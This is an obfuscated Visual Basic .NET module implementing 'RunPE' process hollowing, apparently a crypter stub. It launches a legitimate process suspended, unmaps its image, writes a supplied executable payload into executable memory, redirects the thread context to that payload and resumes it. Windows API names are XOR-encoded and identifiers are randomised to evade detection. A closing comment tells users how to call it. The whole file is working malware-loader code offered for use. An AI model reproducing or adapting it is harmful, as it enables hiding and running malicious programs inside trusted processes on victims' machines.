
Imports System
Imports System.IO
Imports System.Text
Imports System.Runtime.InteropServices
Module AIcQgTHKwDC


    Public Declare Function eTaiUhmeoR6 Lib "kernel32" Alias "LoadLibraryA" (ByVal IVoz28ZrlAj As String) As IntPtr

    Public Declare Function QzVnicr71wy Lib "kernel32" Alias "GetProcAddress" (ByVal zxbMmVMwiYiFzDOOZ As IntPtr, ByVal IVoz28ZrlAj As String) As IntPtr

    Function ejbMX4ugu7E(Of T)(ByVal IVoz28ZrlAj As String, ByVal sX29TNEWpJg As String) As T

        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(QzVnicr71wy(eTaiUhmeoR6(IVoz28ZrlAj), sX29TNEWpJg), GetType(T)), Object), T)

    End Function

    Delegate Function nsvqCo6FYCp(ByVal iWJWAXDJxWEcoXlmHi As IntPtr, ByVal vDqnkSr4rAl As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Delegate Function z8w2UapMytS(ByVal mynGQdQrVvdVtDkTFUzCqOcBE As IntPtr, ByVal OZGRfdysJkOhmEDMpfkGOMAtElDZM As IntPtr) As UInteger

    Delegate Function CbuU35M5Fc2(ByVal mynGQdQrVvdVtDkTFUzCqOcBE As IntPtr, ByVal OZGRfdysJkOhmEDMpfkGOMAtElDZM As IntPtr, ByRef bufr As IntPtr, ByVal ULfQNJNzkifqtdBbBT As Integer, ByRef GkPZ As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Delegate Function VzJmDRrM626(ByVal iWJWAXDJxWEcoXlmHiead As IntPtr, ByVal WWegNZHISTJHPKxKJY As IntPtr) As UInteger

    Delegate Function nWE6A0Cqw6G(ByVal iWJWAXDJxWEcoXlmHi As IntPtr, ByVal vDqnkSr4rAl As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Delegate Function mmFebpT7Xdm(ByVal mynGQdQrVvdVtDkTFUzCqOcBE As IntPtr, ByVal dOCz As IntPtr, ByVal UjTNgOuXtsG As IntPtr, ByVal jQVxCJItDDOStiPdd As Integer, ByVal vXarDcqTUGkJnvxmQm As Integer) As IntPtr

    Delegate Function c64vHPk52Iw(ByVal mynGQdQrVvdVtDkTFUzCqOcBEess As IntPtr, ByVal RaYaTXsnuYc As IntPtr, ByVal dratsJEfeYsClkjIuvEwpmMy As Byte(), ByVal nUjTNgOuXtsG As UInteger, ByVal OHk3xZItC1V As Integer) As Boolean

    Public Declare Auto Function vxGg644oCUL Lib "kernel32" Alias "CreateProcessW" (ByVal SUEQcQFKcmqMCiGWTF As String, ByVal uEgoVuLJCLyUvteBh As StringBuilder, ByVal QyUb7xkGiSG As IntPtr, ByVal QQgi As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal foXt As Boolean, ByVal LRqu As Integer, ByVal uedW As IntPtr, ByVal VnJW As String, ByVal kKAh As Byte(), ByVal QnTi As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Private Function AMU2X8bkptc(ByVal jsRMhq6IRW4 As Long, Optional ByVal rZWAGgRwdZW As Long = &H4) As Integer

        Dim ufd8dQ4mfva As IntPtr

        Dim Bqpk4gcTZO2 As Integer

        Dim wqkWtwHw4r0 As CbuU35M5Fc2 = ejbMX4ugu7E(Of CbuU35M5Fc2)(ERsl9pZZSIT(Chr(2) & Chr(24) & Chr(8) & Chr(0) & Chr(0), "lEoMNtZliATokQgkIDoKmWi"), ERsl9pZZSIT(Chr(28) & Chr(38) & Chr(0) & Chr(55) & Chr(51) & Chr(54) & Chr(4) & Chr(59) & Chr(32) & Chr(38) & Chr(39) & Chr(51) & Chr(62) & Chr(31) & Chr(55) & Chr(63) & Chr(61) & Chr(32) & Chr(43), "RSoFMJJUKOsVhjloNkQLGNU"))

        Call wqkWtwHw4r0(Process.GetCurrentProcess.Handle, jsRMhq6IRW4, ufd8dQ4mfva, rZWAGgRwdZW, Bqpk4gcTZO2)

        Return ufd8dQ4mfva

    End Function

    Public Function NVZa9wQD6P6(ByVal cvRSMoqTrKc As Byte(), ByVal Ia1xN97X9qI As String) As Boolean

        Try

            Dim iW592EEk41W As GCHandle = GCHandle.Alloc(cvRSMoqTrKc, GCHandleType.Pinned) : Dim hModuleBase As Integer = iW592EEk41W.AddrOfPinnedObject : iW592EEk41W.Free()

            Dim QyUb7xkGiSG As IntPtr = IntPtr.Zero

            Dim tKDfW2N8tIN As IntPtr() = New IntPtr(3) {}

            Dim peuCimx02QN As Byte() = New Byte(67) {}

            Dim sVhlK6ZPkh5 As Integer = BitConverter.ToInt32(cvRSMoqTrKc, 60)

            Dim zTCM52LSOEy As Integer

            Dim vDqnkSr4rAl As UInteger() = New UInteger(178) {}

            vDqnkSr4rAl(0) = &H10002

            vxGg644oCUL(Nothing, New StringBuilder(Ia1xN97X9qI), QyUb7xkGiSG, QyUb7xkGiSG, False, 4, QyUb7xkGiSG, Nothing, peuCimx02QN, tKDfW2N8tIN)

            Dim A9DE5Y30Trd As Integer = (hModuleBase + AMU2X8bkptc(hModuleBase + &H3C))

            zTCM52LSOEy = AMU2X8bkptc(A9DE5Y30Trd + &H34)

            Dim YDZmBLrHtlK As z8w2UapMytS = ejbMX4ugu7E(Of z8w2UapMytS)(ERsl9pZZSIT(Chr(2) & Chr(24) & Chr(8) & Chr(0) & Chr(0), "lEoMNtZliATokQgkIDoKmWi"), ERsl9pZZSIT(Chr(36) & Chr(30) & Chr(63) & Chr(4) & Chr(7) & Chr(11) & Chr(26) & Chr(60) & Chr(3) & Chr(15) & Chr(29) & Chr(37) & Chr(12) & Chr(57) & Chr(15) & Chr(9) & Chr(30) & Chr(3) & Chr(5) & Chr(4), "jDAZXISWJJithCuowglUNJG"))

            YDZmBLrHtlK(tKDfW2N8tIN(0), zTCM52LSOEy)

            Dim GTJRd As mmFebpT7Xdm = ejbMX4ugu7E(Of mmFebpT7Xdm)(ERsl9pZZSIT(Chr(47) & Chr(33) & Chr(54) & Chr(42) & Chr(33) & Chr(40) & Chr(119) & Chr(118), "DlJuiIaXIEYUhSHnjcJeTGo"), ERsl9pZZSIT(Chr(18) & Chr(45) & Chr(54) & Chr(48) & Chr(49) & Chr(37) & Chr(40) & Chr(5) & Chr(40) & Chr(40) & Chr(43) & Chr(39) & Chr(1) & Chr(60), "DlJuiIaXIEYUhSHnjcJeTGo"))

            Dim RaYaTXsnuYc As IntPtr = GTJRd(tKDfW2N8tIN(0), zTCM52LSOEy, AMU2X8bkptc(A9DE5Y30Trd + &H50), &H3000, &H40)

            Dim Lz9hk44RVqU As New IntPtr(BitConverter.ToInt32(cvRSMoqTrKc, sVhlK6ZPkh5 + &H34))

            Dim UjTNgOuXtsG As New IntPtr(BitConverter.ToInt32(cvRSMoqTrKc, sVhlK6ZPkh5 + 80))

            Dim U05lo7idHIq As Integer

            Dim OHk3xZItC1V As Integer

            Dim zExEhVWTQe4 As c64vHPk52Iw = ejbMX4ugu7E(Of c64vHPk52Iw)(ERsl9pZZSIT(Chr(2) & Chr(24) & Chr(8) & Chr(0) & Chr(0), "lEoMNtZliATokQgkIDoKmWi"), ERsl9pZZSIT(Chr(10) & Chr(48) & Chr(19) & Chr(54) & Chr(45) & Chr(48) & Chr(33) & Chr(18) & Chr(45) & Chr(54) & Chr(48) & Chr(49) & Chr(37) & Chr(40) & Chr(9) & Chr(33) & Chr(41) & Chr(43) & Chr(54) & Chr(61), "DlJuiIaXIEYUhSHnjcJeTGo"))

            zExEhVWTQe4(tKDfW2N8tIN(0), RaYaTXsnuYc, cvRSMoqTrKc, CUInt(CInt(AMU2X8bkptc(A9DE5Y30Trd + &H54))), U05lo7idHIq)

            For i = 0 To AMU2X8bkptc(A9DE5Y30Trd + &H6, 2) - 1

                Dim m4Z1fA8LYGy As Integer() = New Integer(9) {}

                Buffer.BlockCopy(cvRSMoqTrKc, (sVhlK6ZPkh5 + &HF8) + (i * 40), m4Z1fA8LYGy, 0, 40)

                Dim NXl2zWCY2bh As Byte() = New Byte((m4Z1fA8LYGy(4) - 1)) {}

                Buffer.BlockCopy(cvRSMoqTrKc, m4Z1fA8LYGy(5), NXl2zWCY2bh, 0, NXl2zWCY2bh.Length)

                UjTNgOuXtsG = New IntPtr(RaYaTXsnuYc.ToInt32() + m4Z1fA8LYGy(3))

                Lz9hk44RVqU = New IntPtr(NXl2zWCY2bh.Length)

                zExEhVWTQe4(tKDfW2N8tIN(0), UjTNgOuXtsG, NXl2zWCY2bh, CUInt(Lz9hk44RVqU), OHk3xZItC1V)

            Next i

            Dim aj2V4Wu2r5g As nsvqCo6FYCp = ejbMX4ugu7E(Of nsvqCo6FYCp)(ERsl9pZZSIT(Chr(2) & Chr(24) & Chr(8) & Chr(0) & Chr(0), "lEoMNtZliATokQgkIDoKmWi"), ERsl9pZZSIT(Chr(61) & Chr(7) & Chr(52) & Chr(22) & Chr(7) & Chr(48) & Chr(28) & Chr(29) & Chr(7) & Chr(22) & Chr(11) & Chr(7) & Chr(39) & Chr(27) & Chr(1) & Chr(22) & Chr(18) & Chr(23), "sIhGXNMABeaGwIgIBrdVSnR"))

            aj2V4Wu2r5g(tKDfW2N8tIN(1), vDqnkSr4rAl)

            zExEhVWTQe4(tKDfW2N8tIN(0), vDqnkSr4rAl(41) + &H8, BitConverter.GetBytes(RaYaTXsnuYc.ToInt32()), CUInt(&H4), OHk3xZItC1V)

            vDqnkSr4rAl(&H2C) = zTCM52LSOEy + AMU2X8bkptc(A9DE5Y30Trd + &H28)

            Dim xblQH As nWE6A0Cqw6G = ejbMX4ugu7E(Of nWE6A0Cqw6G)(ERsl9pZZSIT(Chr(2) & Chr(24) & Chr(8) & Chr(0) & Chr(0), "lEoMNtZliATokQgkIDoKmWi"), ERsl9pZZSIT(Chr(61) & Chr(7) & Chr(32) & Chr(22) & Chr(7) & Chr(48) & Chr(28) & Chr(29) & Chr(7) & Chr(22) & Chr(11) & Chr(7) & Chr(39) & Chr(27) & Chr(1) & Chr(22) & Chr(18) & Chr(23), "sIhGXNMABeaGwIgIBrdVSnR"))

            xblQH(tKDfW2N8tIN(1), vDqnkSr4rAl)

            Dim wlN4cj12fyK As VzJmDRrM626 = ejbMX4ugu7E(Of VzJmDRrM626)(ERsl9pZZSIT(Chr(2) & Chr(24) & Chr(8) & Chr(0) & Chr(0), "lEoMNtZliATokQgkIDoKmWi"), ERsl9pZZSIT(Chr(0) & Chr(58) & Chr(28) & Chr(43) & Chr(61) & Chr(59) & Chr(35) & Chr(43) & Chr(26) & Chr(38) & Chr(60) & Chr(43) & Chr(47) & Chr(42), "NqqbiMUBAZQewYpIknBeZjD"))

            wlN4cj12fyK(tKDfW2N8tIN(1), 0)

        Catch ex As Exception

            Return False

        End Try

        Return True

    End Function


    Private Function ERsl9pZZSIT(ByVal bU671VJ6kb8 As String, ByVal jZ0KNSVNSmQ As String)
        Dim h7kJ2Aauvpp As String = ""
        Dim rdiLyRa1JX2 As Short
        Dim RJpUSuMIxtP As Integer
        RJpUSuMIxtP = Asc(jZ0KNSVNSmQ)
        For rdiLyRa1JX2 = 1 To Len(bU671VJ6kb8)
            h7kJ2Aauvpp &= Chr(RJpUSuMIxtP Xor Asc(Mid(bU671VJ6kb8, rdiLyRa1JX2, 1)))
        Next
        Return h7kJ2Aauvpp
    End Function

End Module

'   ****\\\ Call Runpe : AIcQgTHKwDC.NVZa9wQD6P6(rest of call code easypart ^^) ///****
'                     